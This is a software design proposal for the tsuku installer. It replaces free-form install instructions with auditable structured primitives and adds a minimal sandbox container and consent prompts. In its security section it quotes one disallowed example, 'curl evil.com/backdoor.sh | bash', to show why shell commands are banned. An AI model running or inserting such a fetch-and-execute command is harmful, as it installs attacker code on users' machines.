# DESIGN: Structured Primitives for System Dependencies

## Status

Proposed

## Upstream Design Reference

This design implements part of [DESIGN-golden-plan-testing.md](DESIGN-golden-plan-testing.md).

**Relevant sections:**
- Blocker: Structured install_guide for System Dependencies (lines 1465-1515)
- The acceptance criteria for enabling complete golden plan coverage

**Blocking relationship:**
- Issue #745 (enforce golden files for all recipes) is blocked by this design
- Issue #722 (this design) must be completed before #745 can proceed
- Upon completion, all recipes including those with `require_system` steps can be sandbox-tested

## Context and Problem Statement

Recipes with `require_system` steps cannot be execution-validated in the sandbox because the required system packages are not installed in the container. The current `install_guide` field has two problems:

1. **Free-form text**: Contains human-readable instructions, not machine-parseable specifications
2. **Platform keys inside the parameter**: Bakes platform filtering into the field instead of using the step-level `when` clause

**Current state:**

```toml
[[steps]]
action = "require_system"
command = "docker"

[steps.install_guide]
darwin = "brew install --cask docker"
linux = "See https://docs.docker.com/engine/install/"
```

The sandbox executor cannot parse "brew install --cask docker" to install Docker automatically. Additionally, the platform keys (`darwin`, `linux`) duplicate functionality that belongs in the `when` clause - the standard mechanism for platform-specific step filtering.

**Why platform keys in `install_guide` are wrong:**

Consider a recipe that tsuku can install on one platform but requires system packages on another:

```toml
# Current approach (inconsistent)
[[steps]]
action = "download"
url = "https://example.com/tool-linux.tar.gz"
when = { os = ["linux"] }   # <-- platform filtering via when

[[steps]]
action = "require_system"
command = "tool"
[steps.install_guide]        # <-- platform filtering via parameter keys
darwin = "brew install tool"
```

The `download` step uses `when` for platform filtering, but `require_system` uses keys inside `install_guide`. This inconsistency makes recipes harder to reason about.

**Why this matters:**

1. **Incomplete golden coverage**: Issue #745 (enforce golden files for all recipes) is blocked on this issue. Some recipes cannot be sandbox-tested.

2. **Accidental dependencies**: The current sandbox base containers (`debian:bookworm-slim`, `ubuntu:22.04`) include hundreds of pre-installed packages. Recipes tested in these environments may work due to packages "accidentally" present - `ca-certificates`, `tar`, `gzip`, `curl`, shell utilities, shared libraries. A truly minimal environment would expose these hidden assumptions.

3. **Inconsistent platform handling**: Platform filtering should happen at the step level via `when`, not inside action parameters.

4. **Scale requirements**: Tsuku aims to support tens of thousands of tools. At that scale, consistent patterns matter. Every action should use `when` for platform filtering.

**Scope:**

This design addresses:
- Replacing `install_guide` with structured primitives (`packages` and `primitives`)
- Moving platform filtering to the step-level `when` clause
- Enabling sandbox testing for recipes with system dependencies

This design does NOT cover:
- Tsuku installing system packages directly (tsuku remains non-root)
- Replacing package managers (apt, brew, etc.)
- Container image management as a user-facing feature

## Decision Drivers

1. **Consistency**: Platform filtering should use the existing `when` clause, not custom keys inside parameters.

2. **Machine-parseable**: The format must be structured for sandbox container provisioning.

3. **Auditable**: Operations must be statically analyzable (no arbitrary shell commands).

4. **Platform coverage**: The format must support apt, brew, dnf, and be extensible to others.

5. **Simplicity**: Recipe authors should not need to learn complex syntax beyond existing patterns.

## Considered Options

### Decision 1: Platform Filtering Mechanism

How should platform-specific system requirements be expressed?

#### Option 1A: Platform Keys Inside Parameter (Current Approach)

```toml
[[steps]]
action = "require_system"
command = "docker"

[steps.install_guide]
linux = "sudo apt install docker.io"
darwin = "brew install --cask docker"
```

**Pros:**
- Compact (one step for all platforms)
- All platform variants visible together

**Cons:**
- Inconsistent with how other actions handle platforms (via `when`)
- Two filtering mechanisms in recipes (confusing)
- Cannot mix `require_system` with other actions per-platform cleanly

#### Option 1B: Step-Level `when` Clause (Proposed)

Each platform gets its own step, filtered by `when`:

```toml
# Linux
[[steps]]
action = "require_system"
command = "docker"
packages = { apt = ["docker.io"] }
when = { os = ["linux"] }

# macOS
[[steps]]
action = "require_system"
command = "docker"
packages = { brew_cask = ["docker"] }
when = { os = ["darwin"] }
```

**Pros:**
- Consistent with all other actions
- Single platform filtering mechanism
- Easy to mix action types per platform
- Each step is self-contained and simple

**Cons:**
- More verbose (duplicate `command` field)
- Platform variants spread across multiple steps

### Decision 2: Package Specification Format

How should package requirements be structured?

#### Option 2A: Free-Form Text (Current)

```toml
install_guide = "sudo apt install docker.io"
```

**Pros:**
- Flexible for any instruction
- No schema to learn

**Cons:**
- Cannot be machine-executed
- Cannot be validated
- Sandbox testing impossible

#### Option 2B: Structured Primitives

Two mutually exclusive parameters: `packages` (simple) and `primitives` (complex).

**Simple case:**
```toml
[[steps]]
action = "require_system"
command = "docker"
packages = { apt = ["docker.io"] }
when = { os = ["linux"] }
```

**Complex case (multiple operations):**
```toml
[[steps]]
action = "require_system"
command = "docker"
primitives = [
  { apt_repo = { url = "https://download.docker.com/linux/ubuntu", key_url = "...", key_sha256 = "1500c1f..." } },
  { apt = ["docker-ce", "docker-ce-cli", "containerd.io"] },
  { group_add = { group = "docker" } },
  { service_enable = "docker" },
]
when = { os = ["linux"] }
```

**Key constraint: No shell primitive.** All operations use structured primitives that can be statically analyzed.

**Pros:**
- Machine-executable (with user consent)
- Auditable (no arbitrary shell commands)
- Extensible (new primitives added as patterns emerge)
- Content-addressed (external URLs require SHA256)

**Cons:**
- Requires defining primitive vocabulary
- Complex installations need multiple primitives
- New patterns require code changes

### Decision 3: Base Container Strategy

What should the sandbox base container contain?

#### Option 3A: Minimal Container (tsuku + glibc only)

Strip the base container to absolute minimum. Every dependency must be declared.

**Pros:**
- Forces complete dependency declarations
- No "accidental" dependencies masking recipe bugs
- Reproducible across container runtimes

**Cons:**
- Many existing recipes will fail until annotated (currently ~3 recipes with `require_system`, but number may grow)
- Initial migration effort to annotate all affected recipes
- Slower sandbox runs (more packages to install per recipe)
- Base container construction is non-trivial (glibc, locale-archive, SSL certs may all be needed)

#### Option 3B: Current Approach (debian:bookworm-slim)

Keep the current base images with their standard package sets.

**Pros:**
- No migration effort
- Faster sandbox runs for simple tools
- Matches common developer environments

**Cons:**
- Recipes may work due to undeclared dependencies
- Different base images have different packages
- Doesn't catch missing dependency declarations

#### Option 3C: Curated Base Container

Create a custom tsuku base image with a known set of common packages.

**Pros:**
- Controlled environment
- Balance between minimal and practical
- Can version and maintain the image

**Cons:**
- Adds maintenance burden (building/publishing images)
- Still doesn't force complete dependency declarations
- Extra infrastructure to manage

### Decision 4: Package Manager Coverage

Which package managers should the structured format support?

#### Option 4A: Core Package Managers Only

Support the most common package managers: `apt`, `brew`, `dnf`.

**Pros:**
- Covers vast majority of use cases
- Simpler implementation
- Easier to test and maintain

**Cons:**
- Users of Arch (pacman), Alpine (apk) must use fallback text
- Limits adoption in some ecosystems

#### Option 4B: Comprehensive Package Manager Support

Support: `apt`, `brew`, `dnf`, `pacman`, `apk`, `zypper`, `emerge`.

**Pros:**
- Broader platform coverage
- More recipes can be fully structured

**Cons:**
- Testing burden increases
- Maintenance of multiple package manager integrations
- Some managers rarely used in practice

#### Option 4C: Extensible with Core Defaults

Support core managers (apt, brew, dnf) with an extensible schema for adding others.

**Pros:**
- Pragmatic initial scope
- Clear path for expansion
- Community can request additions

**Cons:**
- Initial recipes limited to core managers
- Schema evolution requires careful design

## Decision Outcome

**Chosen: 1B + 2B + 3A + 4C**

### Summary

We remove the `install_guide` field entirely and replace it with structured primitives (`packages` or `primitives` parameters) on platform-specific steps filtered by `when`. This aligns `require_system` with how all other actions handle platform differences. The sandbox base container is stripped to minimal (tsuku + glibc only), forcing complete dependency declarations. We support core package managers initially with an extensible primitive system.

### Rationale

**Why Option 1B (step-level `when`) over 1A (platform keys in parameter):**

Platform filtering belongs at the step level, not inside parameters. This provides:
- **Consistency**: Every action uses `when` for platform filtering
- **Composability**: Easy to mix action types per platform (e.g., `download` on Linux, `require_system` on macOS)
- **Simplicity**: Each step is self-contained with one platform target

The verbosity trade-off (duplicate `command` field) is acceptable because:
- Recipes are generated/validated by tooling, not hand-written at scale
- Explicit is better than implicit for platform behavior
- The `when` clause is already familiar to recipe authors

**Why Option 2B (structured primitives) over 2A (free-form text):**

- **No shell, only primitives**: Arbitrary shell commands with sudo are a security risk that cannot be statically analyzed. By restricting to known primitives (`apt`, `apt_repo`, `brew`, `group_add`, `service_enable`), every recipe can be audited.
- **Machine-executable**: Primitives are designed to be executed by tsuku (with user consent), not just displayed.
- **Content-addressed resources**: All external URLs (GPG keys, repository definitions) require SHA256 hashes.

**Why Option 3A (minimal container) over 3B (current) or 3C (curated):**

- 3A exposes hidden dependencies that 3B masks
- At scale (tens of thousands of tools), hidden dependencies become a major problem
- 3C doesn't solve the underlying issue

**Why Option 4C (extensible core) over 4A or 4B:**

- Start with proven patterns (apt, brew, dnf)
- Add primitives as we encounter new patterns during recipe migration
- Avoids over-engineering upfront while providing clear extension path

## Solution Architecture

### Design Principles

1. **Platform filtering via `when`**: Use the existing step-level `when` clause, not parameter keys
2. **No shell commands**: All operations use structured primitives that can be statically analyzed
3. **Content-addressed resources**: All external URLs require SHA256 hashes
4. **Explicit user consent**: Privileged operations require user confirmation
5. **Extensible vocabulary**: New primitives added through code as patterns emerge

### Step Structure

Each `require_system` step targets a single platform via `when` and specifies either `packages` (simple) or `primitives` (complex):

**Simple case** (single package manager):
```toml
# Linux
[[steps]]
action = "require_system"
command = "docker"
packages = { apt = ["docker.io"] }
when = { os = ["linux"] }

# macOS
[[steps]]
action = "require_system"
command = "docker"
packages = { brew_cask = ["docker"] }
when = { os = ["darwin"] }
```

**Complex case** (multiple operations):
```toml
[[steps]]
action = "require_system"
command = "docker"
primitives = [
  { apt_repo = { url = "https://download.docker.com/linux/ubuntu", key_url = "https://download.docker.com/linux/ubuntu/gpg", key_sha256 = "1500c1f..." } },
  { apt = ["docker-ce", "docker-ce-cli", "containerd.io"] },
  { group_add = { group = "docker" } },
  { service_enable = "docker" },
]
when = { os = ["linux"] }
```

**Mixed recipe** (tsuku installs on one platform, requires system on another):
```toml
# Linux - tsuku can install directly
[[steps]]
action = "download"
url = "https://example.com/tool-{version}-linux.tar.gz"
when = { os = ["linux"] }

[[steps]]
action = "extract"
when = { os = ["linux"] }

# macOS - requires system package
[[steps]]
action = "require_system"
command = "tool"
packages = { brew = ["tool"] }
when = { os = ["darwin"] }
```

### Parameter Schema

The `require_system` action accepts these parameters:

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `command` | string | Yes | Command to check for |
| `packages` | table | No* | Simple package spec (mutually exclusive with `primitives`) |
| `primitives` | array | No* | Ordered primitive list (mutually exclusive with `packages`) |
| `version_flag` | string | No | Flag to get version (e.g., "--version") |
| `version_regex` | string | No | Regex to extract version |
| `min_version` | string | No | Minimum required version |

*One of `packages` or `primitives` is required for sandbox testing.

**`packages` shorthand forms:**
```toml
packages = { apt = ["pkg1", "pkg2"] }
packages = { brew = ["pkg"] }
packages = { brew_cask = ["pkg"] }
packages = { dnf = ["pkg"] }
```

**`primitives` array:**
```toml
primitives = [
  { apt_repo = { url = "...", key_url = "...", key_sha256 = "..." } },
  { apt = ["pkg1", "pkg2"] },
  { group_add = { group = "docker" } },
]
```

### Primitive Vocabulary (Initial Set)

Primitives are the atomic operations tsuku can execute. Each primitive has well-defined behavior and required parameters.

**Package Installation:**

| Primitive | Parameters | Privilege | Description |
|-----------|------------|-----------|-------------|
| `apt` | packages: []string | sudo | Install Debian/Ubuntu packages |
| `apt_repo` | url, key_url, key_sha256 | sudo | Add APT repository with GPG key |
| `dnf` | packages: []string | sudo | Install Fedora/RHEL packages |
| `dnf_repo` | url, key_url, key_sha256 | sudo | Add DNF repository |
| `brew` | packages: []string | user | Install Homebrew formulae |
| `brew_cask` | packages: []string | user | Install Homebrew casks |

**System Configuration:**

| Primitive | Parameters | Privilege | Description |
|-----------|------------|-----------|-------------|
| `group_add` | group: string | sudo | Add current user to group |
| `service_enable` | service: string | sudo | Enable systemd service |
| `service_start` | service: string | sudo | Start systemd service |

**Fallback:**

| Primitive | Parameters | Privilege | Description |
|-----------|------------|-----------|-------------|
| `manual` | text: string | none | Display instructions for manual installation |

### Content-Addressing Requirements

All external resources must be content-addressed to prevent TOCTOU attacks:

```toml
# REQUIRED: key_sha256 must be present
{ apt_repo = {
    url = "https://download.docker.com/linux/ubuntu",
    key_url = "https://download.docker.com/linux/ubuntu/gpg",
    key_sha256 = "1500c1f56fa9e26b9b8f42452a553675796ade0807cdce11975eb98170b3a570"
} }

# ERROR: Missing key_sha256
{ apt_repo = { url = "...", key_url = "..." } }
```

Preflight validation rejects recipes with unhashed external resources.

### Primitive Execution

When tsuku executes primitives (in sandbox or with user consent):

```go
type Primitive interface {
    // Validate checks parameters without side effects
    Validate() error

    // RequiresPrivilege returns true if sudo is needed
    RequiresPrivilege() bool

    // Execute performs the operation
    Execute(ctx *ExecutionContext) error

    // Describe returns human-readable description for consent prompt
    Describe() string
}

// Example: apt primitive
type AptPrimitive struct {
    Packages []string
}

func (p *AptPrimitive) Execute(ctx *ExecutionContext) error {
    args := append([]string{"install", "-y"}, p.Packages...)
    return ctx.RunPrivileged("apt-get", args...)
}

func (p *AptPrimitive) Describe() string {
    return fmt.Sprintf("Install packages: %s", strings.Join(p.Packages, ", "))
}
```

### User Consent Flow

Before executing privileged primitives, tsuku displays what will happen:

```
$ tsuku install docker

This recipe requires system-level changes:

  1. Add APT repository: https://download.docker.com/linux/ubuntu
     GPG key: sha256:1500c1f56fa9e26b9b8f42452a...
  2. Install packages: docker-ce, docker-ce-cli, containerd.io
  3. Add user to group: docker
  4. Enable service: docker

These operations require sudo privileges.

Proceed? [y/N/details]
```

The `details` option shows the exact commands that will be executed.

### Human-Readable Text Generation

For display purposes (when not executing), tsuku generates instructions from primitives:

```go
func GenerateInstallGuide(primitives []Primitive) string {
    var steps []string
    for _, p := range primitives {
        steps = append(steps, p.Describe())
    }
    return strings.Join(steps, "\n")
}
```

Output example:
```
1. Add APT repository: https://download.docker.com/linux/ubuntu
2. Run: sudo apt-get install docker-ce docker-ce-cli containerd.io
3. Add current user to 'docker' group
4. Enable systemd service: docker
```

### Extension Model

New primitives are added when patterns emerge during recipe migration:

1. **Identify pattern**: Multiple recipes need similar operation
2. **Design primitive**: Define parameters, validation, execution
3. **Implement in Go**: Add to `internal/actions/primitives/`
4. **Add to vocabulary**: Update schema validation
5. **Document**: Add to primitive table above

This creates a higher review bar than shell commands - every new operation type requires code review.

**Anticipated future primitives:**
- `pacman`, `apk`, `zypper` - Additional package managers
- `sysctl_set` - Kernel parameter configuration
- `file_write` - Write configuration files (with path allowlist)
- `env_set` - Set environment variables

### Minimal Base Container

Create a new base container with only:

```dockerfile
FROM scratch
COPY --from=builder /tsuku /usr/local/bin/tsuku
COPY --from=builder /lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/
COPY --from=builder /lib64/ld-linux-x86-64.so.2 /lib64/
# ... minimal runtime dependencies for tsuku binary
```

The container cannot run `apt-get` or any package manager. Instead, the sandbox executor builds a derived container with the required packages:

```dockerfile
FROM tsuku/sandbox-base:latest
RUN apt-get update && apt-get install -y docker.io
```

### Sandbox Executor Changes

The sandbox executor is modified to:

1. **Extract primitives**: Parse `require_system` steps from the plan. Steps are already platform-filtered by `when`, so extract `packages` or `primitives` directly.

2. **Compute container image**: Generate a Dockerfile from the base image plus required packages. Hash the package list for caching.

3. **Build or retrieve container**: Check if an image with the package set hash exists. If not, build it.

4. **Run sandbox test**: Use the derived container for sandbox execution.

```go
// DeriveContainerSpec extracts system packages from a plan's require_system steps.
// The plan is already filtered for the target platform, so steps contain only
// the packages/primitives needed for that platform.
//
// Returns (spec, nil) for recipes with complete package specs.
// Returns (nil, nil) for recipes with no require_system steps.
// Returns (nil, UnsupportedRecipeError) for recipes with require_system but no packages/primitives.
func DeriveContainerSpec(plan *executor.InstallationPlan) (*ContainerSpec, error) {
    spec := &ContainerSpec{
        Base:       MinimalBaseImage,
        Packages:   make(map[string][]string),
        Primitives: nil,
    }

    hasRequireSystem := false
    for _, step := range plan.Steps {
        if step.Action != "require_system" {
            continue
        }
        hasRequireSystem = true

        // Check for packages (simple form)
        if packages, ok := step.Params["packages"]; ok {
            for manager, pkgs := range parsePackages(packages) {
                spec.Packages[manager] = append(spec.Packages[manager], pkgs...)
            }
            continue
        }

        // Check for primitives (complex form)
        if primitives, ok := step.Params["primitives"]; ok {
            parsed, err := parsePrimitives(primitives)
            if err != nil {
                return nil, err
            }
            spec.Primitives = append(spec.Primitives, parsed...)
            continue
        }

        // No packages or primitives - cannot sandbox test
        return nil, &UnsupportedRecipeError{
            Recipe:  plan.Tool,
            Command: step.Params["command"].(string),
            Reason:  "missing 'packages' or 'primitives' for sandbox automation",
        }
    }

    if !hasRequireSystem {
        return nil, nil // No system dependencies - use default container
    }

    return spec, nil
}
```

**Note:** The plan passed to `DeriveContainerSpec` is already filtered for the target platform. The `when` clause filtering happens during plan generation, so `require_system` steps in the plan only contain the packages needed for that specific platform.

### Container Image Caching

To avoid rebuilding containers for every test, cache images by package set:

```go
// ContainerImageName generates a deterministic image name for a package set.
func ContainerImageName(spec *ContainerSpec) string {
    // Sort packages for deterministic hash
    var parts []string
    for manager, pkgs := range spec.Packages {
        sort.Strings(pkgs)
        for _, pkg := range pkgs {
            parts = append(parts, fmt.Sprintf("%s:%s", manager, pkg))
        }
    }
    sort.Strings(parts)

    hash := sha256.Sum256([]byte(strings.Join(parts, "\n")))
    return fmt.Sprintf("tsuku/sandbox-cache:%s", hex.EncodeToString(hash[:8]))
}
```

The cache can be local (podman/docker image cache) or remote (GHCR for CI).

### Recipe Validation

Update preflight validation for `require_system`:

```go
func (a *RequireSystemAction) Preflight(params map[string]interface{}) *PreflightResult {
    result := &PreflightResult{}

    // Command is required
    if _, ok := GetString(params, "command"); !ok {
        result.AddError("require_system action requires 'command' parameter")
    }

    // Check for packages or primitives
    hasPackages := params["packages"] != nil
    hasPrimitives := params["primitives"] != nil

    if hasPackages && hasPrimitives {
        result.AddError("'packages' and 'primitives' are mutually exclusive")
    }

    if !hasPackages && !hasPrimitives {
        result.AddWarning("missing 'packages' or 'primitives' - sandbox testing will be skipped")
    }

    // Validate packages structure
    if hasPackages {
        if err := validatePackagesStructure(params["packages"]); err != nil {
            result.AddError("invalid packages structure: %s", err)
        }
    }

    // Validate primitives structure and content-addressing
    if hasPrimitives {
        if err := validatePrimitivesStructure(params["primitives"]); err != nil {
            result.AddError("invalid primitives structure: %s", err)
        }
    }

    return result
}
```

### Migration Path

Since tsuku is pre-GA and all recipes are in the repo, we do a clean migration:

1. **Remove `install_guide`**: Delete the field entirely from `require_system` action
2. **Add `packages` and `primitives`**: Implement the new parameters
3. **Migrate recipes**: Convert docker.toml, cuda.toml, test-tuples.toml to new format with `when` clauses
4. **Validate**: Ensure all recipes pass preflight and can be sandbox-tested

## Implementation Approach

### Phase 1: Refactor require_system Action

1. Remove `install_guide` parameter from `require_system` action
2. Add `packages` parameter (simple form: `{ apt = [...] }`)
3. Add `primitives` parameter (complex form: array of primitive objects)
4. Update preflight validation (mutually exclusive, structure validation)
5. Migrate existing recipes (docker.toml, cuda.toml, test-tuples.toml) to use `when` clauses

### Phase 2: Primitive Framework

1. Create `internal/actions/primitives/` package with `Primitive` interface
2. Implement core primitives: `apt`, `apt_repo`, `brew`, `brew_cask`, `manual`
3. Add content-addressing validation for external URLs
4. Implement `Describe()` for human-readable output generation

### Phase 3: Sandbox Execution

1. Create minimal base container Dockerfile (tsuku + glibc only)
2. Publish base image to GHCR (tsukumogami/sandbox-base)
3. Implement primitive execution in sandbox context (root in container)
4. Add container image caching by primitive hash
5. Integrate with existing sandbox executor

### Phase 4: User Consent and Host Execution

1. Implement user consent flow (display primitives, confirm)
2. Add `--system-deps` flag to `tsuku install` to enable host execution
3. Implement privilege escalation (sudo) for host execution
4. Add audit logging for privileged operations
5. Add dry-run mode (`--dry-run`) to show what would be executed

### Phase 5: Extension

1. Add primitives as needed: `dnf`, `dnf_repo`, `group_add`, `service_enable`
2. Strip sandbox base container further as hidden dependencies are discovered
3. Update CONTRIBUTING.md with primitive documentation

## Security Considerations

### Trust Model

This design uses a layered trust model with explicit boundaries:

| Layer | Trust Source | Verification |
|-------|-------------|--------------|
| Recipe content | PR review by maintainers | Human review |
| External resources | Content-addressing (SHA256) | Automated hash verification |
| Package managers | Distribution signatures | apt/dnf GPG, Homebrew checksums |
| Primitive operations | Fixed vocabulary in tsuku code | Code review for new primitives |

**Key security property**: No arbitrary shell commands. All operations use primitives with well-defined, auditable behavior. This enables static analysis of what a recipe will do.

### Download Verification

**External resources are content-addressed.** All URLs in primitives (GPG keys, repository definitions) require SHA256 hashes:

```toml
{ apt_repo = {
    url = "https://download.docker.com/linux/ubuntu",
    key_url = "https://download.docker.com/linux/ubuntu/gpg",
    key_sha256 = "1500c1f56fa9e26b9b8f42452a553675796ade0807cdce11975eb98170b3a570"
} }
```

This prevents TOCTOU attacks where resources change between review and installation. Preflight validation rejects recipes with unhashed resources.

Package installation uses trusted package managers (apt, brew, dnf) which handle their own verification (GPG signatures for apt/dnf, SHA256 for Homebrew).

### Execution Isolation

**Sandbox context (containers):**
- Primitives execute as root inside the container
- Container is ephemeral - destroyed after test
- No host filesystem access beyond explicit mounts
- Resource limits (memory, CPU, process count)
- No host network unless explicitly required

**Host context (user machine):**
- Primitives execute via sudo with explicit user consent
- User must confirm each privileged operation
- Audit log records what was executed
- Dry-run mode available to preview operations

**Why no shell primitive:**
```toml
# NOT ALLOWED - arbitrary code execution
{ shell = "curl evil.com/backdoor.sh | bash" }

# ALLOWED - well-defined, auditable operation
{ apt = ["docker-ce"] }
```

Once shell commands are allowed, static analysis becomes impossible. The attacker surface expands to any shell syntax, variable expansion, subshells, etc.

### Supply Chain Risks

**Package manager trust**: This design trusts apt, brew, and dnf repositories. An attacker who compromises these repositories could inject malicious packages. This is an existing risk for anyone using these package managers - tsuku does not add new trust requirements.

**Recipe review**: All primitives are visible in the TOML recipe. Reviewers can audit:
- Which packages are installed
- Which repositories are added (with their GPG keys)
- Which groups the user is added to
- Which services are enabled

**Primitive vocabulary control**: New primitives require code changes to tsuku, creating a higher review bar than allowing arbitrary shell commands.

**Content-addressing**: External URLs must have SHA256 hashes computed at review time. If an upstream resource changes, the hash check fails and installation is blocked.

### User Data Exposure

**Sandbox context:**
- No user data mounted into container
- Only recipe plan, download cache, and tsuku binary (all read-only)
- Container destroyed after execution

**Host context:**
- Primitives operate on system paths (e.g., `/etc/apt/sources.list.d/`)
- No access to user home directory or personal files
- Operations logged for audit trail

## Future Work

The following items were identified during design review but are deferred for post-MVP implementation. They represent scaling considerations that will become relevant as the primitive vocabulary and recipe count grow.

### Tiered Extension Model

The current design requires Go code changes for every new primitive. At scale (tens of thousands of recipes), this creates friction. A future tiered extension model could include:

1. **Core primitives (Go)**: Security-sensitive operations (apt_repo, group_add, service_enable) that require full code review
2. **Composite primitives (TOML)**: Combinations of core primitives defined in recipe syntax (e.g., `add_docker_repo` = apt_repo + apt)
3. **Verified scripts**: Reviewed shell scripts with attestation, for edge cases that don't fit the primitive model

This would balance security (core primitives) with extensibility (composites and verified scripts).

### Automatic Primitive Analysis

A `tsuku analyze <recipe>` command could:

1. Parse existing `install_guide` text instructions
2. Propose structured `packages` primitives
3. Identify external resources needing SHA256 hashes
4. Suggest migration patches

This would accelerate migration when scaling to thousands of recipes.

### Platform Version Constraints

The `when` clause currently supports OS and architecture filtering, but apt packages vary by distribution version. Future work could extend `when` to support distribution versions:

```toml
[[steps]]
action = "require_system"
command = "docker"
packages = { apt = ["docker-ce"] }
when = { os = ["linux"], distro = ["ubuntu-24.04"] }

[[steps]]
action = "require_system"
command = "docker"
packages = { apt = ["docker.io"] }
when = { os = ["linux"], distro = ["ubuntu-22.04"] }
```

This would require extending `WhenClause` to support distribution detection and matching.

### Container Cache Optimization

At scale, the content-addressed cache may grow large. Future optimizations:

- **Layered caching**: Share common package sets across recipes
- **Cache eviction**: LRU or reference-counted cleanup
- **Remote cache**: GHCR or S3-backed cache for CI

### Privilege Escalation Paths

Certain primitives (`group_add`, `file_write`, `service_enable`) enable indirect privilege escalation. Future work should:

- Document which primitives create escalation paths
- Consider allowlisting for sensitive primitives (e.g., only specific groups allowed)
- Add runtime checks in host execution context

## Consequences

### Positive

- **Consistency**: Platform filtering uses `when` clause everywhere, not mixed mechanisms.
- **Complete golden coverage**: All recipes can be sandbox-tested, including those with system dependencies.
- **Composability**: Easy to mix action types per platform (download on Linux, require_system on macOS).
- **Explicit dependencies**: The minimal base container forces recipes to declare all required packages.
- **Machine-executable**: Tsuku can install system dependencies automatically (with user consent).
- **Auditable**: No shell commands - every operation uses a primitive that can be statically analyzed.
- **Content-addressed**: External resources are pinned by SHA256, preventing TOCTOU attacks.
- **Extensible**: New primitives can be added as patterns emerge during recipe migration.

### Negative

- **Verbosity**: Platform-specific steps duplicate `command` field across steps.
- **Infrastructure**: Requires building and publishing minimal base container images.
- **Primitive vocabulary**: Complex installations may require multiple primitives or new primitive types.
- **Extension overhead**: New patterns require code changes to add primitives (by design, but adds friction).

### Mitigations

- **Verbosity**: Recipes are validated by tooling; explicit is better than implicit for platform behavior.
- **Infrastructure**: GitHub Actions can build and publish base images on release.
- **Primitive vocabulary**: Start with common patterns (apt, brew, dnf); add primitives as needed.
- **Extension overhead**: The overhead is intentional - it creates a review gate for new operation types.
